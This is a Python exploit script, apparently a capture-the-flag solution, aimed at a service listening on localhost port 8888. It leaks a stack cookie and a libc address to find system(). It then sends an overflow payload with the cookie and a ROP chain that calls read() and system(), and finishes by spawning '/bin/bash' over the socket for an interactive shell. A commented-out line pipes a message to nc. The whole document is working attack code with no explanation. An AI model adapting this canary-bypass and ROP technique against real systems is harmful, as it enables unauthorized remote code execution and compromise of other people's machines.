from isis import *
pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'

def connect():
	s = get_socket(("localhost", 8888))
	s.settimeout(1000000)
	time.sleep(2)
	recv_all(s)
	return s

def leak(s):	
	s.send("4\n")
	recv_all(s)
	s.send("yyyyyyyyyy\n")
	recv_until(s, "'yyyyyyyyyy")
	x = ulei(s.recv(0x500))
	return x

def crash(s, cookie, rop):
	s.send("4\n")
	recv_all(s)
	load = "y"*10
	load += lei(cookie)
	load += rop
	load += "\n"
	s.send(load) 

def read_rop():
	read_plt = 0x08048620
	got_buf = 0x0804b044
	ret = 0x08048b2c
	fd = 0x4
	size = 0x40
	return lei(read_plt,
		   ret,
		   fd,
		   got_buf,
		   size)
	
def call_sys(sys):
	string = 0x0804b044
	ret = 0xdeadbeef
	return lei(sys,
		ret,
		string)
#STAGE 1
s = connect()
x = leak(s)
cookie = x[0]- 0xa	
print "COOKIE: " + hex(cookie)
system = x[2] - 0x9b363
print "SYSTEM: " + hex(system)
s.close()

#STAGE 2
s = connect()
s.send("\n\n")
recv_all(s)
pattern = "A" * 12
pattern += read_rop()
pattern += call_sys(system)
raw_input("?")
crash(s, cookie, pattern)
#command = "echo SOLVED | nc LOCALHOST 1337;"
command = "/bin/bash 0>&4 1>&4"
s.send(command + "\n")
telnet_shell(s)
